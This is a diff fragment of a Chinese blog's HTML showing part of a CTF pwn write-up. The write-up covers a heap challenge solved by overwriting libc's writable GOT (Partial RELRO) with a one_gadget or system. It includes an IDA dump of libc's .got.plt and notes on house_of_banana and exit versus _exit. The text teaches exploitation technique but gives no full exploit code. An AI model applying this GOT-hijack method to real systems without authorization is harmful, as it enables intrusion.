-<h2 id="一次任意地址写任意值…结束了吗？"><a href="#一次任意地址写任意值…结束了吗？" class="headerlink" title="一次任意地址写任意值…结束了吗？"></a>一次任意地址写任意值…结束了吗？</h2><p>现在我们只要申请堆块就能任意地址写任意值了。高版本移除了hook函数，有一个任意地址写任意值来getshell，我自己是想到了house_of_banana.这个利用是程序用<code>exit()</code>退出的话，有一条<code>_dl_fini-&gt;_rtld_global-&gt;link_map.finiarray</code>的函数指针执行流，而函数指针是通过link_map中的l_loaded保存的程序基地址加偏移定位的。具体利用这里不展开，可以参考这两篇blog,后面也会单独写blog（或许）：</p>
+<h2 id="一次任意地址写任意值…结束了吗？">一次任意地址写任意值…结束了吗？</h2>
+<p>现在我们只要申请堆块就能任意地址写任意值了。高版本移除了hook函数，有一个任意地址写任意值来getshell，我自己是想到了house_of_banana.这个利用是程序用<code>exit()</code>退出的话，有一条<code>_dl_fini-&gt;_rtld_global-&gt;link_map.finiarray</code>的函数指针执行流，而函数指针是通过link_map中的l_loaded保存的程序基地址加偏移定位的。具体利用这里不展开，可以参考这两篇blog,后面也会单独写blog（或许）：</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/345968.html">https://www.freebuf.com/articles/system/345968.html</a><br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31</a><br>这里我搞了半天发现就是打不通，fini_array里有一个指针是在base+0xbad8处，我在堆块上写好gadget后将l_loaded改成chunk-0xbad8打不通。有点卡住了，因为我们没法再泄露程序的基地址了。aslr会让堆的偏移不固定，我们只能保证heap内部的偏移而无法保证它和程序的偏移，利用链有点断了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/345968.html">https://www.freebuf.com/articles/system/345968.html</a><br>
+<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31</a><br>
+这里我搞了半天发现就是打不通，fini_array里有一个指针是在base+0xbad8处，我在堆块上写好gadget后将l_loaded改成chunk-0xbad8打不通。有点卡住了，因为我们没法再泄露程序的基地址了。aslr会让堆的偏移不固定，我们只能保证heap内部的偏移而无法保证它和程序的偏移，利用链有点断了。</p>
 </blockquote>
 <p>这时候研究wp，发现他任意地址写了一个神秘地点，gdb打印显示是<code>*ABS*@got.plt</code>, 发给学长询问学长也不懂，但是提供了一个分析思路。在ida中分析libc查这个偏移发现是libc的got表，而且这段是可读写的？！原来是程序开了FULL RELRO但是libc只开了Partial RELRO。而程序中调用到的strlen还有strtok等函数在libc的got表里。我们写这个got为onegadget就能直接getshell了。</p>
 <blockquote>
 <p>所以为什么libc自己这个动态库还要got跳转。。。</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:000000000021A000 ; ===========================================================================</span><br><span class="line">.got.plt:000000000021A000</span><br><span class="line">.got.plt:000000000021A000 ; Segment type: Pure data</span><br><span class="line">.got.plt:000000000021A000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:000000000021A000 _got_plt        segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.got.plt:000000000021A000                 assume cs:_got_plt</span><br><span class="line">.got.plt:000000000021A000                 ;org 21A000h</span><br><span class="line">.got.plt:000000000021A000                 dq offset stru_219BC0</span><br><span class="line">.got.plt:000000000021A008 qword_21A008    dq 0                    ; DATA XREF: sub_28000↑r</span><br><span class="line">.got.plt:000000000021A010 qword_21A010    dq 0                    ; DATA XREF: sub_28000+6↑r</span><br><span class="line">.got.plt:000000000021A018 off_21A018      dq offset strnlen       ; DATA XREF: j_strnlen+4↑r</span><br><span class="line">.got.plt:000000000021A018                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A020 off_21A020      dq offset rawmemchr     ; DATA XREF: j_rawmemchr+4↑r</span><br><span class="line">.got.plt:000000000021A020                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A028 off_21A028      dq offset realloc       ; DATA XREF: _realloc+4↑r</span><br><span class="line">.got.plt:000000000021A030 off_21A030      dq offset strncasecmp   ; DATA XREF: j_strncasecmp+4↑r</span><br><span class="line">.got.plt:000000000021A030                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A038 off_21A038      dq offset _dl_exception_create</span><br><span class="line">.got.plt:000000000021A038                                         ; DATA XREF: __dl_exception_create+4↑r</span><br><span class="line">.got.plt:000000000021A040 off_21A040      dq offset mempcpy       ; DATA XREF: j_mempcpy+4↑r</span><br><span class="line">.got.plt:000000000021A040                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A048 off_21A048      dq offset wmemset       ; DATA XREF: j_wmemset+4↑r</span><br><span class="line">.got.plt:000000000021A048                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A050 off_21A050      dq offset calloc        ; DATA XREF: _calloc+4↑r</span><br><span class="line">.got.plt:000000000021A058 off_21A058      dq offset strspn        ; DATA XREF: j_strspn+4↑r</span><br><span class="line">.got.plt:000000000021A058                                         ; Indirect relocation</span><br><span class="line">[.......]</span><br></pre></td></tr></table></figure>
-
-<h2 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget..?"></a>onegadget..?</h2><p>虽然没有沙箱，但是execve的gadget全都打不通。再回去看wp，发现他使用的-l 1找到的<code>posix_spawn</code>的gadget。这玩意好像会新开线程，涉及子进程什么的可能gdb会有问题，所以之前用gdb一调就打不通不调就能打通。</p>
-<p>思路捋清了之后我自己又改了几个偏移和onegadget但是都打不通。。。只能说确实厉害。那篇将protobuf的blog下面是看了strtok内部的调用strspn然后改了got直接用system，最后传了whatsize&#x3D;0x30触发分支来getshell的。</p>
+<h2 id="onegadget…">onegadget…?</h2>
+<p>虽然没有沙箱，但是execve的gadget全都打不通。再回去看wp，发现他使用的-l 1找到的<code>posix_spawn</code>的gadget。这玩意好像会新开线程，涉及子进程什么的可能gdb会有问题，所以之前用gdb一调就打不通不调就能打通。</p>
+<p>思路捋清了之后我自己又改了几个偏移和onegadget但是都打不通。。。只能说确实厉害。那篇将protobuf的blog下面是看了strtok内部的调用strspn然后改了got直接用system，最后传了whatsize=0x30触发分支来getshell的。</p>
 <blockquote>
 <p>onegadget execve的估计这个题都够呛</p>
 </blockquote>
 <p>最后，搞了半天发现house_of_banana之所以不触发，是因为这个程序一是没有main函数return，而是用的退出都是<code>_exit()</code>而非<code>exit()</code>，这俩函数在程序里都叫exit但是通过偏移我去libc看了下源码，这个<code>_exit</code>只有短短几行，没有任何多余处理直接是陷入内核syscall来触发。而我们说的那些调用链,io什么乱七八糟的归根结底都是用户态glibc的机制。exit的内部最后也是调用的<code>_exit</code>。下次要小心了。。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题收获还是不少的：</p>
-<ul>
-<li>protobuf通讯get– √</li>
-<li><strong>全新的利用：检查libc的got保护，从libc层面劫持got表，可以借助本地同版本有符号的libc进行定位或者是在ida静态分析libc文件找偏移</strong>– √</li>
-<li>高版本glibc的tcache和fastbin指针加密与泄露–√</li>
-<li>house_of_banana思路（虽然没成功）–√</li>
-<li>_exit和exit的天壤之别 –√</li>
+<h1>总结</h1>
+<p>这道题收获还是不少的：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>protobuf通讯get-- √</p>
+</li>
+<li class="lvl-2">
+<p><strong>全新的利用：检查libc的got保护，从libc层面劫持got表，可以借助本地同版本有符号的libc进行定位或者是在ida静态分析libc文件找偏移</strong>– √</p>
+</li>
+<li class="lvl-2">
+<p>高版本glibc的tcache和fastbin指针加密与泄露–√</p>
+</li>
+<li class="lvl-2">
+<p>house_of_banana思路（虽然没成功）–√</p>
+</li>
+<li class="lvl-2">
+<p>_exit和exit的天壤之别 --√</p>
+</li>
 </ul>
 
     </article>
@@ -747,7 +791,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Protobuf"><span class="toc-number">2.</span> <span class="toc-text">Protobuf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="toc-number">3.</span> <span class="toc-text">程序控制流</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#add"><span class="toc-number">3.1.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete"><span class="toc-number">3.2.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show"><span class="toc-number">3.3.</span> <span class="toc-text">show</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1"><span class="toc-number">3.4.</span> <span class="toc-text">沙箱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%9D%97%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%9F"><span class="toc-number">3.5.</span> <span class="toc-text">堆块的操作？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E2%80%94%E2%80%94tcache%E5%92%8Cfastbin%E6%8C%87%E9%92%88%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">泄露——tcache和fastbin指针加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">4.2.</span> <span class="toc-text">fastbin dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E4%BB%BB%E6%84%8F%E5%80%BC%E2%80%A6%E7%BB%93%E6%9D%9F%E4%BA%86%E5%90%97%EF%BC%9F"><span class="toc-number">4.3.</span> <span class="toc-text">一次任意地址写任意值…结束了吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onegadget"><span class="toc-number">4.4.</span> <span class="toc-text">onegadget..?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Protobuf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">程序控制流</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#add"><span class="toc-number">3.1.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete"><span class="toc-number">3.2.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show"><span class="toc-number">3.3.</span> <span class="toc-text">show</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1"><span class="toc-number">3.4.</span> <span class="toc-text">沙箱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%9D%97%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%9F"><span class="toc-number">3.5.</span> <span class="toc-text">堆块的操作？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E2%80%94%E2%80%94tcache%E5%92%8Cfastbin%E6%8C%87%E9%92%88%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">泄露——tcache和fastbin指针加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">4.2.</span> <span class="toc-text">fastbin dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E4%BB%BB%E6%84%8F%E5%80%BC%E2%80%A6%E7%BB%93%E6%9D%9F%E4%BA%86%E5%90%97%EF%BC%9F"><span class="toc-number">4.3.</span> <span class="toc-text">一次任意地址写任意值…结束了吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onegadget%E2%80%A6"><span class="toc-number">4.4.</span> <span class="toc-text">onegadget…?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1027,6 +1071,12 @@
         
         
     
+        
+        
+        
+        
+        
+        
         
         
         
@@ -1849,24 +1899,9 @@
                 算法
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Android">
-                <span class="iconfont-archer">&#xe606;</span>
-                Android
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="逆向">
-                <span class="iconfont-archer">&#xe606;</span>
-                逆向
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="pwn">
                 <span class="iconfont-archer">&#xe606;</span>
                 pwn
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="chop">
-                <span class="iconfont-archer">&#xe606;</span>
-                chop
             </span>
         
             <span class="sidebar-tag-name" data-tags="wp">
@@ -1879,6 +1914,21 @@
                 heap
             </span>
         
+            <span class="sidebar-tag-name" data-tags="Android">
+                <span class="iconfont-archer">&#xe606;</span>
+                Android
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="chop">
+                <span class="iconfont-archer">&#xe606;</span>
+                chop
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="CSAPP">
                 <span class="iconfont-archer">&#xe606;</span>
                 CSAPP
@@ -1887,6 +1937,11 @@
             <span class="sidebar-tag-name" data-tags="Lab">
                 <span class="iconfont-archer">&#xe606;</span>
                 Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
             </span>
         
             <span class="sidebar-tag-name" data-tags="Windows">
@@ -1899,19 +1954,9 @@
                 CVE
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Develop">
-                <span class="iconfont-archer">&#xe606;</span>
-                Develop
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="protobuf">
                 <span class="iconfont-archer">&#xe606;</span>
                 protobuf
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="kernel">
-                <span class="iconfont-archer">&#xe606;</span>
-                kernel
             </span>
         
             <span class="sidebar-tag-name" data-tags="FSOP">
@@ -1919,14 +1964,19 @@
                 FSOP
             </span>
         
-            <span class="sidebar-tag-name" data-tags="llvm">
+            <span class="sidebar-tag-name" data-tags="kernel">
                 <span class="iconfont-archer">&#xe606;</span>
-                llvm
+                kernel
             </span>
         
             <span class="sidebar-tag-name" data-tags="Rust">
                 <span class="iconfont-archer">&#xe606;</span>
                 Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="llvm">
+                <span class="iconfont-archer">&#xe606;</span>
+                llvm
             </span>
         
             <span class="sidebar-tag-name" data-tags="vm">
